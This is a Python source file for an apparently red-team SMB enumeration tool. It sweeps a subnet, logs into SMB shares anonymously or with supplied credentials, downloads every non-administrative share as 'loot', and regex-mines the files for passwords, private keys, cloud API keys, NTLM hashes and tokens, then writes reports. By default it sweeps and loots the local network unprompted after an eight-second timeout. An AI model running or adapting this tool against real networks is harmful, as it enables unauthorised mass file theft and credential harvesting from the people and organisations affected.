import socket
import os
import platform
import re
import time
import json
import threading
import datetime
from ipaddress import ip_network, IPv4Address
from pathlib import Path
from html import escape

# Load environment variables from .env file
try:
    from dotenv import load_dotenv
except ImportError:
    os.system("pip install python-dotenv")
    from dotenv import load_dotenv

load_dotenv()

# ASCII Art Placeholder
print("""

   ▄████████   ▄▄▄▄███▄▄▄▄   ▀█████████▄          ▄████████ ███    █▄  ███▄▄▄▄   ███▄▄▄▄      ▄████████    ▄████████ 
  ███    ███ ▄██▀▀▀███▀▀▀██▄   ███    ███        ███    ███ ███    ███ ███▀▀▀██▄ ███▀▀▀██▄   ███    ███   ███    ███ 
  ███    █▀  ███   ███   ███   ███    ███        ███    ███ ███    ███ ███   ███ ███   ███   ███    █▀    ███    ███ 
  ███        ███   ███   ███  ▄███▄▄▄██▀        ▄███▄▄▄▄██▀ ███    ███ ███   ███ ███   ███  ▄███▄▄▄      ▄███▄▄▄▄██▀ 
▀███████████ ███   ███   ███ ▀▀███▀▀▀██▄       ▀▀███▀▀▀▀▀   ███    ███ ███   ███ ███   ███ ▀▀███▀▀▀     ▀▀███▀▀▀▀▀   
         ███ ███   ███   ███   ███    ██▄      ▀███████████ ███    ███ ███   ███ ███   ███   ███    █▄  ▀███████████ 
   ▄█    ███ ███   ███   ███   ███    ███        ███    ███ ███    ███ ███   ███ ███   ███   ███    ███   ███    ███ 
 ▄████████▀   ▀█   ███   █▀  ▄█████████▀         ███    ███ ████████▀   ▀█   █▀   ▀█   █▀    ██████████   ███    ███ 
                                                 ███    ███                                               ███    ███ 
Author: Sanalnadh M Kattungal
Envestnet - Offensive Security [RED TEAM]
""")

# Check platform and module dependencies
print("[*] Platform: ", platform.system())
try:
    from smb.SMBConnection import SMBConnection
    print("[+] pysmb module is available.")
except ImportError:
    if platform.system().lower() == "windows":
        print("[!] pysmb not found. Installing with pip...")
        os.system("pip install pysmb")
    else:
        print("[!] pysmb not found. Installing with pip...")
        os.system("python3 -m pip install pysmb --break-system-packages")
    from smb.SMBConnection import SMBConnection

# Load credentials from environment
SMB_USER = os.getenv("SMB_USER", "")
SMB_PASS = os.getenv("SMB_PASS", "")
SMB_DOMAIN = os.getenv("SMB_DOMAIN", "")

# Global variables
alive_hosts = []
timestamp = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
download_dir = f"smb_loot - {timestamp}"
sensitive_info = []
summary_info = {}

class TimedInput:
    def __init__(self):
        self.value = None

    def get_input(self, prompt, timeout):
        def input_thread():
            try:
                self.value = input(prompt)
            except:
                self.value = None
        t = threading.Thread(target=input_thread)
        t.daemon = True
        t.start()
        t.join(timeout)
        return self.value

def is_valid_ip(ip):
    try:
        socket.inet_aton(ip)
        return True
    except socket.error:
        return False

def is_host_alive(ip):
    param = "-n" if platform.system().lower() == "windows" else "-c"
    command = f"ping {param} 1 {ip} > nul 2>&1" if platform.system().lower() == "windows" else f"ping {param} 1 {ip} > /dev/null 2>&1"
    return os.system(command) == 0

def ping_sweep(network):
    global alive_hosts
    print(f"\n[*] Scanning network: {network}")
    alive_hosts.clear()
    for ip in ip_network(network).hosts():
        if is_host_alive(str(ip)):
            print(f"[+] Host alive: {ip}")
            alive_hosts.append(str(ip))

def scan_ports(ip, ports=[139, 445]):
    open_ports = []
    for port in ports:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(1)
                if s.connect_ex((ip, port)) == 0:
                    open_ports.append(port)
        except:
            pass
    return open_ports

def smb_enum(ip):
    try:
        conn = SMBConnection(
            SMB_USER or "", 
            SMB_PASS or "", 
            "autoenum", 
            "target", 
            domain=SMB_DOMAIN or "", 
            use_ntlm_v2=True
        )
        if conn.connect(ip, 139, timeout=10):
            if SMB_USER:
                print(f"[+] Authenticated login success on {ip} as {SMB_USER}")
            else:
                print(f"[+] Anonymous login success: {ip}")
            shares = conn.listShares()
            for share in shares:
                if not share.isSpecial and share.name not in ["ADMIN$", "C$", "IPC$"]:
                    print(f"[*] Accessing share: {share.name}")
                    summary_info.setdefault(ip, []).append(share.name)
                    download_share(conn, share.name, ip)
        conn.close()
    except Exception as e:
        print(f"[!] SMB error on {ip}: {e}")

def download_share(conn, share_name, ip, path="", local_base=download_dir):
    try:
        files = conn.listPath(share_name, path + "/")
        for file in files:
            if file.filename in [".", ".."]:
                continue
            remote_path = f"{path}/{file.filename}" if path else file.filename
            dir_path = os.path.join(local_base, f"{share_name}_{ip}")
            local_path = os.path.join(dir_path, remote_path.replace('/', '_'))
            if file.isDirectory:
                download_share(conn, share_name, ip, remote_path, local_base)
            else:
                os.makedirs(os.path.dirname(local_path), exist_ok=True)
                with open(local_path, 'wb') as f:
                    conn.retrieveFile(share_name, remote_path, f)
                    print(f"[+] Downloaded: {remote_path}")
    except Exception as e:
        print(f"[!] Download error: {e}")

regex_patterns = {
    'Email': r"[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+",
    'Password': r"(?i)(password|pwd|pass).{0,10}['\"=:\s]+[\S]{4,}",
    'PrivateKey': r"-----BEGIN [A-Z ]+PRIVATE KEY-----[\s\S]+?-----END [A-Z ]+PRIVATE KEY-----",
    'AWS_KEY': r"AKIA[0-9A-Z]{16}",
    'AWS_SECRET': r"(?i)aws_secret_access_key.{0,10}['\"=:\s]+[A-Za-z0-9/+=]{40,}",
    'Username': r"(?i)(username|user).{0,10}['\"=:\s]+[\w.-]+",
    'IPv4': r"\b(?:[0-9]{1,3}\.){3}[0-9]{1,3}\b",
    'Domain': r"(?i)(DOMAIN|workgroup)[ =:\"']+\w+",
    'NTLM Hash': r"[a-fA-F0-9]{32}:[a-fA-F0-9]{32}",
    'JWT Token': r"eyJ[A-Za-z0-9_-]+?\.[A-Za-z0-9_-]+?\.[A-Za-z0-9_-]+",
    'URI/URL': r"https?://[\w./?=&%-]+",
    'Token': r"(?i)(bearer|token|api[_\-]?key|secret)['\"=:\s]+[A-Za-z0-9._\-]{10,}",
    'Credential File': r"(?i)(credentials|secrets|vault|keyfile|auth).*?\.(txt|ini|cfg|yml|json|env)",
    'Mongo URI': r"mongodb(?:\+srv)?://[^\s\"']+",
    'Slack Token': r"xox[baprs]-[0-9a-zA-Z]{10,48}",
    'Google API Key': r"AIza[0-9A-Za-z-_]{35}",
    'Heroku API Key': r"(?i)heroku[a-z0-9]{32}",
    'SSH Password': r"(?i)(ssh_password|sshpass).{0,10}['\"=:\s]+[\S]{4,}",
}

def scan_sensitive_data(base_path=download_dir):
    global sensitive_info
    sensitive_info.clear()
    for root, _, files in os.walk(base_path):
        for file in files:
            try:
                file_path = os.path.join(root, file)
                with open(file_path, errors='ignore') as f:
                    lines = f.readlines()
                    for i, line in enumerate(lines):
                        for label, pattern in regex_patterns.items():
                            if re.search(pattern, line, re.DOTALL):
                                sensitive_info.append((file_path, label, line.strip()))
            except:
                continue

def generate_report():
    timestamp = int(time.time())
    txt_path = os.path.join(download_dir, f"report_{timestamp}.txt")
    json_path = os.path.join(download_dir, f"report_{timestamp}.json")
    html_path = os.path.join(download_dir, f"report_{timestamp}.html")

    with open(txt_path, 'w') as report:
        for path, label, data in sensitive_info:
            report.write(f"[{label}] in {path}:\n{data}\n{'-'*40}\n")

    with open(json_path, 'w') as j:
        json.dump(sensitive_info, j, indent=4)

    with open(html_path, 'w') as h:
        h.write("<html><body><ul>")
        for path, label, data in sensitive_info:
            h.write(f"<li><b>{escape(label)}</b> in {escape(path)}:<br><code>{escape(data)}</code></li>")
        h.write("</ul></body></html>")

    print(f"[+] Reports saved: \n{txt_path}, \n{json_path}, \n{html_path}")

def show_summary():
    print("\n========== Summary ==========")
    for host, shares in summary_info.items():
        print(f"Host: {host}")
        for share in shares:
            print(f"  Share: {share}")
    print("============================")
    print("\n[+] Sensitive Data Found:")
    for path, label, data in sensitive_info:
        print(f"... {path} ==> \033[92m[{label}] {data}\033[0m")
    print("\n[*] Script finished. Exiting...")

if __name__ == '__main__':
    os.makedirs(download_dir, exist_ok=True)
    timed = TimedInput()
    print("""
================== MENU ==================
0 - SMB Auto Enumeration
1 - Enter Custom Scope
2 - Extract Sensitive Information
3 - Generate a Report
4 - Show Summary
5 - Exit
==========================================
""")
    choice = timed.get_input("Select option [Default=0]: ", 8)
    if not choice: choice = "0"

    if choice == "0":
        local_ip = socket.gethostbyname(socket.gethostname())
        network = local_ip.rsplit('.', 1)[0] + ".0/24"
        ping_sweep(network)
        for host in alive_hosts:
            if scan_ports(host):
                smb_enum(host)
        scan_sensitive_data()
        generate_report()
        show_summary()

    elif choice == "1":
        scope = input("Enter subnet or IP: ").strip()
        try:
            if "/" in scope:
                ip_network(scope)
                ping_sweep(scope)
            elif is_valid_ip(scope):
                if is_host_alive(scope):
                    alive_hosts.clear()
                    alive_hosts.append(scope)
                else:
                    print("[-] Host not alive")
                    exit()
            else:
                raise ValueError
            for host in alive_hosts:
                if scan_ports(host):
                    smb_enum(host)
            scan_sensitive_data()
            generate_report()
            show_summary()
        except ValueError:
            print("[-] Invalid input.")

    elif choice == "2":
        scan_sensitive_data()
        generate_report()
        show_summary()

    elif choice == "3":
        generate_report()
        show_summary()

    elif choice == "4":
        show_summary()

    elif choice == "5":
        print("Exiting...")

    else:
        print("[-] Invalid selection.")
